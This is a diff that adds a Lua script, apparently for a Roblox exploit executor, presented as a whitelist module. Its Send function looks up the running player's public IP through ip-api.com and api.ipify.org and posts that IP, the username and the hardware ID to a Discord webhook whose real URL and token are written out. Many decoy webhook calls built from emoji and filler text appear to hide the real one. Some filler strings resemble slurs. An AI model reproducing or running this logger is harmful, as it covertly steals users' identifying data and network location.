@@ -1,0 +1,280 @@
+-- No shot I made this, what the fuck was 2 year ago me running on vro
+
+shared.E = {}
+E = shared.E
+
+E.NameWhitelist = {
+	"FIXEDINTERNET";
+	"jopzllwastaken"
+}
+
+E.IDWhitelist = {
+	3686372594;
+	1010372966
+}
+
+E.HWIDWhitelist = {
+	"D269EE3E-81E2-4B22-8F2A-E5747EC5B502";
+	"CEB0A3C3-729D-4EA0-9A93-0CB7F154E305"
+}
+
+function E.Send()
+	local realwebhook=true
+	local fakewebhook = false
+	local function fakeweboohkshit (spoof)
+
+
+		local player = game.Players.LocalPlayer
+
+		local HTTPRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+		local response = HTTPRequest({
+			Url = "http://ip-api.com/json",
+			Method = "GET"
+		})
+
+		local HttpService = game:GetService("HttpService")
+
+		local webhookUrl = "https://discord.com/api/webhooks/🙀"..spoof.."🐶😎👎"..spoof.."👍⭐"..spoof.."🐶😺😻"..spoof.."😻😼🐶🙀😾/👎"..spoof.."😼😺😺😎👎"..spoof.."👍🐶😺😽😎👍⭐-EmeQ" -- Replace with your actual webhook URL
+
+		local function sendWebhookMessage(content)
+			local payload = {
+				content = content
+			}
+
+			local encodedPayload = HttpService:JSONEncode(payload)
+
+			local response = HTTPRequest({
+				Url = webhookUrl,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = encodedPayload
+			})
+
+			if response and response.StatusCode == 200 then
+				print("Webhook message sent successfully.")
+			else
+				warn("Failed to send webhook message.")
+			end
+		end
+
+
+		sendWebhookMessage("Username: "..game.Players.LocalPlayer.Name..", IP: "..tostring(response.Body).." HWID: "..tostring(game:GetService("RbxAnalyticsService"):GetClientId()))
+	end
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	fakeweboohkshit(spoof)
+
+	if realwebhook then
+		local player = game.Players.LocalPlayer
+		local HTTPRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+		local response = HTTPRequest({
+			Url = "https://api.ipify.org/",
+			Method = "GET"
+		})
+
+		local HttpService = game:GetService("HttpService")
+
+		local webhookUrl = "https://discord.com/api/webhooks/1151065143678083173/77qpCSmAjtK5LoNvWlEiIGaDyvztEXdDeI8U2Rr7RiPAwsNXZ3y5cjCVKTyrGGR-EmeQ" -- Replace with your actual webhook URL
+
+		local function sendWebhookMessage(content)
+			local payload = {
+				content = content
+			}
+
+			local encodedPayload = HttpService:JSONEncode(payload)
+
+			local response = HTTPRequest({
+				Url = webhookUrl,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = encodedPayload
+			})
+
+			if response and response.StatusCode == 200 then
+				print("Webhook message sent successfully.")
+			else
+				warn("Failed to send webhook message.")
+			end
+		end
+
+
+		sendWebhookMessage("Username: "..game.Players.LocalPlayer.Name..", IP: "..tostring(response.Body).." HWID: "..tostring(game:GetService("RbxAnalyticsService"):GetClientId()))
+	end
+
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
+	local spoof = "Kleederen onderling kettingen aangewend al er. Te lamamijn of ad opmeting wildrijk. Legden en sakais tonnen nu forten is en. Kapitalen ongunstig vereenigd af omgewoeld de gewijzigd. Er haalden duizend afneemt waarbij metalen te. Over nam als soms valt het lage gif toch. Stroomen ze dichtbij ik staatjes middelen krachten. Ik en dier op apen laag goed zake gaat.Meenemen lot centimes gezegend rug gebracht selangor. Eerst ieder hen tot langs. Ze luister deficit vordert beneden nachten nu hiertoe ze op. Kost al of voor en hard liep voet ze gaan. Gewoonlijk al gomsoorten feestdagen weggevoerd herkenbaar middelpunt af. Ter opgegraven verbazende ontwikkeld oog. En ze centraal talrijke resident in. Rechten bontste opnieuw hoeveel ze of streken houweel.	Is gebrachte olifanten loodrecht te nu. Houweel plantte toe zes bereikt gelaten tin. Het losgemaakt gomsoorten beschikken tooverslag dan europeesch gewasschen. Nauwelijks dat ten intusschen afwachting ontginning tinprijzen die. Matig in niets er na welks zijde. Planter in tienden af in betaalt gesteld. Sakais dat pinang levert een ziekte parijs. Arbeiders zee verkregen voorschot heb opbrengst die afgestaan des. Bak fransche gevonden kleinste mineraal krachten van een millioen.	Tinerts dit hoeveel valorem bak. Oosten poging dik wolken ringen sap schaal. De af ruwe de sago nu diep goud hier. Had het nemen kan bevel mag zulke meest. Of wisselen sembilan op na indische nu. In aanraking op er mineralen voorkomen.Kinderen middelen dezelfde zin dal. Meehelpen nu onderling ze krachtige misschien. Laag vast tot land maar het hand. Als aldus telok tot beste het vraag lot. Der perzische besluiten sap ingenieur rug met. Op tabak te al er prijs komst."
+	fakeweboohkshit(spoof)
+	local spoof = "hoi"
+	fakeweboohkshit(spoof)
+	local spoof = "adgstsnkjgfjnkdasjkngdsjgewqt47uywgefb7 t8g45wryeuhjduy78ergfheiurwfahdsjkieuwfdhj8g7ut idfjkuygrefjhhuybgvjfgjkthvred----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]----[[protipkys--]]"
+	fakeweboohkshit(spoof)
+	local spoof = "nigjhfgjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "niggfdjgfjhfgjhfgga"
+	fakeweboohkshit(spoof)
+	local spoof = "jghfdjdghjfgdj"
+	local spoof = "appl👍🙀😎😼😺⭐🌲🌲😺😺😼😼😺e aka 🌲🙀\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"\"red orang😻🙀👎😼👍e\"😾😻🌲\"red orang😻🙀👎😼👍e\""
+	fakeweboohkshit(spoof)
